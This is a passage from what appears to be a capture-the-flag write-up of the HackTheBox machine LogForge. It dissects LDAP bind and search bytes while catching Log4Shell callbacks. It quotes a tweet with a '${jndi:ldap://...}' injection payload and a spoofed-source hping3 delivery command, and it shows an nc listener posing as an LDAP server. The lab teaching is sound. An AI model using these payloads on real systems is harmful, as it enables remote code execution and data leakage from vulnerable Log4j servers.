I used Wireshark to look at the LDAP requests and capture the path requested. I can’t just use `nc` to catch the reply, because the client expects some protocol steps before it will request the path. [This tweet](https://twitter.com/hackerfantastic/status/1470866086199443467) from HackerFantastic shows how to use `nc` to interact with LDAP:

> echo -e '${jndi:ldap://x.x.x.x:389/${java:version}}' > exploit.txt  
> screen -dmS log4j echo -e '0\x0c\x02\x01\x01a\x07\x0a\x01\x00\x04\x00\x04\00' | nc -vv -l -p 1389 | xxd  
> hping3 -2 -s 514 -p 514 -c 3 -a 23.75.195.2 [$host](https://twitter.com/search?q=%24host&src=ctag&ref_src=twsrc%5Etfw) -E exploit.txt -d `ls -al exploit.txt | awk '{print $5}'`
>
> — Hacker Fantastic (@hackerfantastic) [December 14, 2021](https://twitter.com/hackerfantastic/status/1470866086199443467?ref_src=twsrc%5Etfw)

The line I care about here is in the middle - it’s using `screen` to run in the background, and then using `echo -e` to put the necessary bytes into `nc` and then printing the results into `xxd`.

I can do the same here:

```

oxdf@parrot$ echo -e '0\x0c\x02\x01\x01a\x07\x0a\x01\x00\x04\x00\x04\00' | nc -nvv -l -p 389 | xxd
Listening on 0.0.0.0 389

```

Now if I trigger that (like putting in the JNDI string in Tomcat manager or with the FTP username), the connection shows the string:

```

Connection received on 10.10.11.138 53458
00000000: 300c 0201 0160 0702 0103 0400 8000 3046  0....`........0F
00000010: 0201 0263 2404 0466 696c 650a 0100 0a01  ...c$..file.....
00000020: 0302 0100 0201 0001 0100 870b 6f62 6a65  ............obje
00000030: 6374 436c 6173 7330 00a0 1b30 1904 1732  ctClass0...0...2
00000040: 2e31 362e 3834 302e 312e 3131 3337 3330  .16.840.1.113730

```

### LDAP Protocol Dive

#### Bind Request / Response

LDAP messages are a predefined set of objects each given in the format “[type] [length] [value]”. So the integer 4 would be `02 01 04`. Or the string “uid” would be `0a 03 75 69 64`.

So what is “0\x0c\x02\x01\x01a\x07\x0a\x01\x00\x04\x00\x04\00”?

In Wireshark, they break that down as a successful LDAP bind response.

![Wireshark LDAP](https://0xdfimages.gitlab.io/img/logforge-wireshark-ldap-response.png)

Looking at the stream in hex dumb mode, I can see what both sides are sending:

![Wireshark LDAP](https://0xdfimages.gitlab.io/img/logforge-wireshark-ldap-stream.png)

The client starts out with a bind request:

![Wireshark LDAP](https://0xdfimages.gitlab.io/img/logforge-wireshark-ldap.png)

That exactly matches what [this documentation](https://ldap.com/ldapv3-wire-protocol-reference-bind/) gives as an example of “an anonymous simple bind request with a message ID of one and no request controls”:

```

30 0c -- Begin the LDAPMessage sequence
   02 01 01 --  The message ID (integer value 1)
   60 07 -- Begin the bind request protocol op
      02 01 03 -- The LDAP protocol version (integer value 3)
      04 00 -- Empty bind DN (0-byte octet string)
      80 00 -- Empty password (0-byte octet string with type context-specific
            -- primitive zero)

```

That same page show the example response with minimal optional details as :

```

30 0c -- Begin the LDAPMessage sequence
   02 01 01 -- The message ID (integer value 1)
   61 07 -- Begin the bind response protocol op
      0a 01 00 -- success result code (enumerated value 0)
      04 00 -- No matched DN (0-byte octet string)
      04 00 -- No diagnostic message (0-byte octet string)

```

That’s an exact match for what I’m putting into `nc` to fake a LDAP server. Basically, I’m sending back the bytes that say “your bind attempt is successful”.

#### LDAP Search Request

For the purposes of catching the environment variables in the url path, just seeing the hexdump is enough. But it’s not too difficult to break it down a bit further. The hex dump for the request looks like:

```

00000000: 300c 0201 0160 0702 0103 0400 8000 3046  0....`........0F
00000010: 0201 0263 2404 0466 696c 650a 0100 0a01  ...c$..file.....
00000020: 0302 0100 0201 0001 0100 870b 6f62 6a65  ............obje
00000030: 6374 436c 6173 7330 00a0 1b30 1904 1732  ctClass0...0...2
00000040: 2e31 362e 3834 302e 312e 3131 3337 3330  .16.840.1.113730

```

The first 14 bytes the bind request. Then after the bind response, what arrives starts with the last two bytes on the first line. It’s a LDAP search request. Using [the docs](https://ldap.com/ldapv3-wire-protocol-reference-search/) and Wireshark, it breaks down to:

```

30 46 -- Begin LDAP search request (with length of 0x46 = 72)
   02 01 02 -- The message ID (integer value 2)
   63 24 -- Begin Search Protocol Op
       04 04 66 69 6c 65 -- Search, octet string "file"
       0a 01 00 -- Scope baseObject
       0a 01 03 -- Always deref aliases
       02 01 00 -- Size Limit unlimited
       02 01 00 -- Time limit unlimited
       01 01 00 -- Types only flag, boolean false
       87 0b 6f 62 6a 65 63 74 43 6c 61 73 73 -- Present Filter, string 0x0b long, objectClass
   30 00 -- Attributes (empty)
   a0 1b 30 19 04 17 32 2e 31 36 2e 38 34 30 2e 31 2e 31 31 33 37 33 30 -- Control item 

```

The important thing here is the search string “file”. It’s also interesting that the last item, control items, has length of 0x1b, but only shows 0x15 bytes. In the Wireshark dump it shows those six bytes appearing on a different line:

```

0000000E  30 46 02 01 02 63 24 04  04 66 69 6c 65 0a 01 00   0F...c$. .file...
0000001E  0a 01 03 02 01 00 02 01  00 01 01 00 87 0b 6f 62   ........ ......ob
0000002E  6a 65 63 74 43 6c 61 73  73 30 00 a0 1b 30 19 04   jectClas s0...0..
0000003E  17 32 2e 31 36 2e 38 34  30 2e 31 2e 31 31 33 37   .2.16.84 0.1.1137
0000004E  33 30 2e 33 2e 34 2e 32                            30.3.4.2 

```

I didn’t dive into what happens here, but maybe it’s coming in a different packet after `nc` has already tried to consider the connection closed. But I haven’t verified that, as I’ve gone deep enough into this rabbit hole for now.